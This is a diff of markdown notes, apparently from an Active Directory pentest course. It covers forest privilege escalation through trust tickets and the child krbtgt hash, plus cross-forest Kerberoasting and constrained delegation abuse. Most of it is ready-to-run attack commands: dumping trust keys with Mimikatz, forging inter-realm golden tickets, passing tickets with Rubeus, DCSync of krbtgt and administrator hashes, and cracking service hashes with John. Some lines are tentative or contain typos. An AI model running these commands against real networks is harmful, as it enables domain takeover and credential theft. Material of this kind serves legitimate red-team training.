@@ -6,8 +6,9 @@ Child to Parent using Trust Tickets
 
 * sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
 * sIDHistory can be abused in two ways of escalating privileges within a forest: \
-  – krbtgt hash of the child \
-  – Trust tickets
+  – krbtgt hash of the child domain controller\
+  – Trust tickets (Changed every 30 days)
+* Graphic: Number 5 TGS Request contains inter-real TGT, which is signed by the trust key
 
 
 
@@ -15,12 +16,12 @@ Child to Parent using Trust Tickets
 
 **Requirements**
 
-* DA
+* DA on child
 * SafetyKatz.exe on DC
 
 ### **Tool - Using TrustKey**
 
-**Export Trustkey**
+1. **Export Trustkey on DC**
 
 <pre class="language-powershell"><code class="lang-powershell">Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dchostname
 or
@@ -30,13 +31,14 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"
 
 Output:
 <strong>Domain: dom.local (dom/ S-1-5-2...) 
-</strong>[ In ] sub.dom.lcao -> dom.local
- => Take rcklist4_hmac_nt  ....
-
+</strong>[ In ] sub.dom.lcao -> dom.local    
+ => Take that rcklist4_hmac_nt  ....
+ => We cant use AES key, they are not supported (?)
+ The other keys like In-1 or In-2 are the old keys. They get rotaed every 30 days.
 
 </code></pre>
 
-**Forge an inter-realm TGT**
+2. **Forge an inter-realm TGT**
 
 {% code overflow="wrap" %}
 ```powershell
@@ -47,22 +49,21 @@ Invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:sub.dom.
 ```
 {% endcode %}
 
-**Get a TGS for a Service in target domain with the new ticket / then use TGS to access targeted service**
+3. **Get a TGS for a Service in target domain with the new ticket / then use TGS to access targeted service/domain**
 
-{% code overflow="wrap" %}
-```powershell
-rubeus.exe asktgs /ticket:C:\save-ticket-here.kirbi /service:cifs/forest-dc-hostname.dom.local /dc:forest-dc-hostname.dom.local /ptt
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">rubeus.exe asktgs /ticket:C:\save-ticket-here.kirbi /service:cifs/forest-dc-hostname.dom.local /dc:forest-dc-hostname.dom.local /ptt
 ls \\forest-dc-hostname.dom.local\c$
 
 .\asktgs.exe C:\save-ticket-here.kirbi CIFS/forest-dc-hostname.dom.local
-.\kirbikator.exe lsa .\CIFS/forest-dc-hostname.dom.local
-ls \\forest-dc-hostname.dom.local\c$
-Run DC Sync
-C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forestname\krbtgt /domain:forest.local" "exit"
-```
-{% endcode %}
 
-### Tool - Using krbtgt hash
+.\kirbikator.exe lsa .\CIFS/forest-dc-hostname.dom.local  //maybe need to do it twice
+ls \\forest-dc-hostname.dom.local\c$
+<strong>
+</strong><strong>Then run DC Sync
+</strong>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forestname\krbtgt /domain:forest.local" "exit"
+</code></pre>
+
+### Tool - Using krbtgt hash of the child domain
 
 {% code overflow="wrap" %}
 ```powershell
@@ -81,6 +82,9 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:parentdom\krbtgt /domain:paren
 
 Run DC Sync
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forestname\krbtgt /domain:forest.local" "exit"
+
+
+Rest, see above
 ```
 {% endcode %}
 
@@ -125,6 +129,84 @@ External Trust keys, don't automatically get renewed
 Lookup:\
 SIDHistory Attack for Parent-Child Domain\
 SID Filtering is active for External and Forest Trusts.
+
+## Cross Forest Kerberoast
+
+### Description
+
+* It is possible to execute Kerberoast across Forest trusts.&#x20;
+* Let's enumerate named service accounts across forest trusts
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>1. Get all SPNs which are across forest
+</strong><strong>Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}
+</strong>krbtgt account can be ignored, has default SPN configured
+
+ADModule
+Get-ADTrust -Filter 'IntraForest -ne $true' | %{GetADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name} 
+
+2. Request a TGT
+C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:trusted-dom.local /outfile:trusted-dom.txt
+Check the TGS
+klist
+Crack using John
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
+
+or Request TGS accross trust using PowerShell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local 
+</code></pre>
+
+### Requirement
+
+* EA in one Forest
+
+
+
+## Cross Forest - Constrained Delegation with Protocol Transition
+
+### Description
+
+* The classic Constrained Delegation does not work across forest trusts.
+* But we can abuse it once we have a beachhead/foothold across forest trust. If we have a User in the target forest, we can attack it!
+
+{% code overflow="wrap" %}
+```powershell
+Get-DomainUser –TrustedToAuth -Domain eu.local      //eu.local is the trusted/target forest
+Get-DomainComputer –TrustedToAuth -Domain eu.local
+
+ADModule
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} - Properties msDS-AllowedToDelegateTo -Server eu.local
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} - Properties msDS-AllowedToDelegateTo -Server eu.local | Select msDS-AllowedToDelegateTo -expandproperty msDS-AllowedToDelegateTo
+```
+{% endcode %}
+
+Request an alternative ticket using Ruebeus
+
+{% code overflow="wrap" %}
+```powershell
+If we have a Password of a User first get the hash
+C:\AD\Tools\Rubeus.exe hash /password:Qwerty@2019 /user:storagesvc /domain:eu.local
+
+C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC
+/impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eudc.eu.local /ptt
+Altservice can be choosen as wished
+```
+{% endcode %}
+
+Abuse the TGS to LDAP to do a dcsync
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"' 
+
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
+C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator --Domain eu.local --DomainController eu-dc.eu.local 
+```
+{% endcode %}
+
+
+
+
 
 ## AD Certificate Service (CS)
 
